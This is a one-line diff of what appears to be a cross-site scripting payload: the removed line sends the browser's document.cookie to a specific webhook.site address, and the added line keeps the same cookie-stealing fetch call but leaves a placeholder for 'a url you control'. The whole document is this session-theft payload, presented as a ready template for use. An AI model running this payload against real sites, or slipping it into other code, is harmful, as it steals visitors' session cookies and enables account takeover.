@@ -1,1 +1,1 @@
-fetch("https://webhook.site/2affc27b-f04c-478a-9e5c-0eecb3343ba4?cookie=" + document.cookie);
+fetch("<webhook url or a url you control goes in here>?cookie=" + document.cookie);
